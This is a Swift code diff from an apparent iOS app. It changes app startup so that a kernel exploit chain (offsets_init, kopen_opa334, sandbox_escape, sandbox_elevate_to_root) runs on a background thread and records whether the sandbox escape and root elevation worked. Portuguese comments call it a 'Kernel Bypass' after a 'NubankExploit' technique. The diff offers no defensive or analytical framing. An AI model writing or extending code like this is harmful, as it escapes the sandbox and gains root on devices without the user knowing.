@@ -47,15 +47,28 @@ class AppState: ObservableObject {
             self?.deactivate()
         }
         
-        // Inicializar exploits e aplicar Kernel Bypass (técnica NubankExploit)
-        offsets_init()
-        kopen_opa334()
-        
-        let selfProc = proc_self()
-        if selfProc != 0 {
-            sandbox_escape(selfProc)
-            sandbox_elevate_to_root(selfProc)
-            print("[EXPLOIT] Startup Kernel Bypass Applied")
+        // Executar exploits em background para nunca congelar a thread principal (evita tela preta)
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            offsets_init()
+            kopen_opa334()
+            
+            let selfProc = proc_self()
+            if selfProc != 0 {
+                let escResult = sandbox_escape(selfProc)
+                sandbox_elevate_to_root(selfProc)
+                DispatchQueue.main.async {
+                    if escResult == 0 {
+                        self?.exploitStatus = .success(method: "Kernel OPA334 / DarkSword")
+                    } else {
+                        self?.exploitStatus = .failed(method: "Kernel Bypass", code: Int64(escResult))
+                    }
+                    print("[EXPLOIT] Startup Kernel Bypass Finished with result: \(escResult)")
+                }
+            } else {
+                DispatchQueue.main.async {
+                    self?.exploitStatus = .failed(method: "Kernel Bypass", code: -999)
+                }
+            }
         }
     }
 
